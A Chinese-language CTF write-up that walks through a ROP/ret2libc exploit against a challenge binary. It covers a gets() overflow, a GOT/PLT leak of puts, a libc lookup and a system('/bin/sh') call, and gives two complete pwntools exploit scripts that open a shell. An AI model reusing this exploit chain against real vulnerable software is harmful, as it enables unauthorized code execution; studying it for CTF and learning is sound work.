简单用实例演示一下rop攻击流程，图上是overflow后，调用exit()函数
1.overflow覆盖掉old ebp
2.塞入gadget1
3.塞入要调用函数的系统调用号，exit()的系统调用号为1，具体的可以在([https://w3challs.com/syscalls/?arch=x86)中查询](https://w3challs.com/syscalls/?arch=x86\)%E4%B8%AD%E6%9F%A5%E8%AF%A2)
4.系统调用，执行exit()函数。
完成了一个简单的rop。
## 解题流程
根据思路构造payload
`payload = offset+
p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)`  
`payload_2 = offset + p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)`
第一步:根据
可知构造0x50+0x7个字节覆盖ebp。因为这个题目在获取输入之后后对输入进行简单的处理。
所以payload在构造的时候
`payload = 'l' *7+ 'x00' + 'a'*80`
由于gets（）函数遇到x00截断，所以这样构造可以避免对payload进行加密。
tips:在比赛的时候忽略了这个，还傻傻写解密算法，浪费了时间，我是第四个提交的，要不还能拿个三血啥的。
第二步：寻找合适的gadget片段。又因为System V AMD64 ABI (Linux、FreeBSD、macOS 等采用)
中前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9
寄存器中，如果还有更多的参数的话才会保存在栈上。而puts只需一个的传入，所以需要找pop rdi;ret用 pop
指令将栈顶数据弹入寄存器。ret到puts函数
第三步：在ida中查找puts函数在got表和plt表中的位置。
先讲一下leak为什么要找这两个位置
GOT(Global Offset
Table)：全局偏移表用于记录在ELF文件中所用到的共享库中符号的绝对地址。在程序刚开始运行时GOT表项是空的，当符号第一次被调用时会动态解析符号的绝对地址然后转去执行，并将被解析符号的绝对地址记录在GOT中，第二次调用同一符号时，由于GOT中已经记录了其绝对地址，直接转去执行即可，不用重新解析。
PLT(Procedure Linkage
Table)：过程链接表的作用是将位置无关的符号转移到绝对地址。当一个外部符号被调用时，PLT去引用GOT中的其符号对应的绝对地址，然后转入并执行。
还要涉及linux的延迟绑定机制
当程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT 表再次跳转回
PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT
表跳转到 GOT 表，此时 GOT 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。整个过程如下
第一次调用：
第二次：
延迟绑定的核心思想是函数第一次被用到时才进行绑定，这种做法可以大大加速程序的启动速度，特别有利于一些有大量函数引用和大量模块的软件。
从上边不难看出，got表中存的是函数的绝对地址，也就是基址加上offest后的地址，也正是我们期望泄露的地址。
明白了概念，就在ida中找吧。
puts_got：
puts_plt:
第四步：找到main函数地址，让程序执行了puts()函数之后，跳回main函数继续执行
前部分leak payload至此已经构造完成，测试
泄露的地址为7ffff7a7c690
第五步：根据后三位去libc-database中查找libc版本
查找结果有两个，因为脚本为本地运行，所以是第一个，实战中可以用python的一个模块去检测，下边会说。
第六步：把对应libc库拷贝下来，放入ida，查找
puts_off
system_off
bin_off
所有的地址都已经找齐，exp脚本如下：
    from pwn import *
    context.log_level = True
    p = process('./Emachine')
    p.recvuntil("choice!n")
    p.sendline('1')
    p.recvuntil("encryptedn")
    puts_plt = 0x4006e0
    puts_off = 0x6F690
    put_addr = 0x7ffff7a7c690
    bin_off = 0x18CD57
    system_off = 0x45390
    payload = 'l' *7+ 'x00' + 'a'*80
    payload = payload + p64(0x400c83) + p64(0x602020) + p64(0x4006e0) + p64(0x4009a0)
    p.sendline(payload)
    print p.recvline()
    print p.recvline()
    print p.recvline()
    print p.recvline()
    payload = 'l' *7+ 'x00' + 'a'*80
    payload = payload +  p64(0x400c83) + p64(put_addr - puts_off + bin_off) +p64(put_addr - puts_off + system_off)
    p.sendline(payload)
    p.recvline()
    p.recvline()
    p.interactive()
其实写到这里有人会说，这道题这么简单，而且有很多py模块可以通过一个方法就可以完成你的这些手工找的工作，但是我想说的是，做什么事其实都不能过分的去依赖工具，一定要知道它的实质，看似一条命令就可以找到地址，但是一定要知道函数调用流程，这样会让你对问题有更加深刻的理解。
我是学逆向入门ctf这个坑的，学了两年，刚开始也是依赖于od,ida,peid,windbg,edb……这些工具，但是我们导师就给我指出了了不足，一定要知道这些工具的底层实现方法，这样才能走的更高，走的更远。比如od的下段指令F2,看似很简单不就是一个，但是你想过它的原理和中断执行流程，以及计算机硬件是如何实现的，想过它的优缺点吗？我在学习逆向的时候，就看了计算机组成原理，更深入的理解了中断系统在CPU中的作用和地址。简单说一下int
3断点也就是OD中的F2:
原理：改变断点地址处的第一个字节为CC指令，在OD中不显示
缺点：容易被检测到，如检测MessageBoxA处CC断点
优点：可以设置无数个
非常推荐大家看一下程序用的自我修养这本书，看完之后对elf文件的理解会更上一层楼。学pwn一定要对堆栈调用，程序装载，链接，常见溢出的利用方法了如指掌。基础很重要，千万不要依赖工具，要知道工具背后的原理。
####  贴出来exp2：
    from pwn import *
    from LibcSearcher import *
    context.log_level = 'debug'
    r = process("./Emachine")
    file = ELF("./Emachine")
    puts_plt = file.plt['puts']
    puts_got = file.got['puts']
    main_addr = file.symbols['main']
    r.recvuntil("Input your choice!n")
    r.sendline("1")
    r.recvuntil("Input your Plaintext to be encryptedn")
    offset = 'l' *7+ 'x00' + 'a'*80
    pop_rdi_addr = 0x0000000000400c83
    payload = offset+ p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
    r.sendline(payload)
    r.recvuntil("Ciphertextn")
    r.recvuntil("n",drop=True)
    puts_addr = u64(r.recvuntil("n",drop=True)+"x00x00")
    obj = LibcSearcher("puts", puts_addr)
    libc_puts = obj.dump("puts")
    base_addr = puts_addr-libc_puts
    system_addr = base_addr + obj.dump("system")
    bash_off = obj.dump("str_bin_sh") 
    binsh_addr = bash_off+base_addr
    payload_2 = offset + p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)
    r.recvuntil("Input your choice!n")
    r.sendline("1")
    r.recvuntil("Input your Plaintext to be encryptedn")
    r.sendline(payload_2)
    r.recv()
    r.recv()
    sleep(0.2)
    r.interactive()
[一些用于泄露libc版本的工具](https://www.jianshu.com/p/8d2552b8e1a2)
## 结语
给大家安利几个我学pwn时候收集的几个优秀资源吧。
这个视频非常推荐！！！！！！！
[https://www.youtube.com/channel/UC_PU5Tk6AkDnhQgl5gAROb](https://www.youtube.com/channel/UC_PU5Tk6AkDnhQgl5gARObA)
文章中如有错误和不足，希望各位大佬，能批评指正